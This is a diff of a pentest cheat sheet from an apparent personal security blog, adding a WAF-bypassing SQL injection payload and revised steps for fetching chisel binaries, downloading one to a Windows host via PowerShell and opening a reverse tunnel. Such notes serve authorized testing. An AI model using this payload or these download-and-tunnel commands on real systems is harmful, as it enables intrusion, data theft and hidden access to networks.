@@ -1,4 +1,4 @@
-# [snovvcrash’s Security Blog](https://snovvcrash.github.io)
+[**snovvcrash’s Security Blog**](https://snovvcrash.github.io)
 
 [//]: # (# -- 5 spaces before)
 [//]: # (## -- 4 spaces before)
@@ -906,6 +906,14 @@ name=snovvcrash&email=admin%example.com++++++++++11&password=qwe123
 
 
 
+### Commas blocked by WAF
+
+```
+id=-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b ON 1=1#
+```
+
+
+
 ### Write File
 
 ```
@@ -1133,15 +1141,21 @@ root@kali:$ nslookup
 Reverse forward port 1111 from Windows machine to port 2222 on Linux machine:
 
 ```
-root@kali:$ wget [1/linux] -O chisel && chmod +x chisel
-root@kali:$ wget [1/windows] -O chisel.exe && upx chisel.exe
+root@kali:$ wget [1/linux] -O chisel.gz && gunzip chisel.gz && ls chisel*
+root@kali:$ mv chisel_??? chisel && chmod +x chisel
+
+root@kali:$ wget [1/windows] -O chisel.exe.gz && gunzip chisel.exe.gz && ls chisel*
+root@kali:$ mv chisel_???.exe chisel.exe && upx chisel.exe
 root@kali:$ md5sum chisel.exe
+
 root@kali:$ ./chisel server -p 8000 -v -reverse
 
 PS> (new-object net.webclient).downloadfile("http://127.0.0.1/chisel.exe", "$env:userprofile\music\chisel.exe")
 PS> get-filehash -alg md5 chisel.exe
 PS> Start-Process -NoNewWindows chisel.exe client 127.0.0.1:8000 R:127.0.0.1:2222:127.0.0.1:1111
 ```
+
+1. [github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
 
 
 
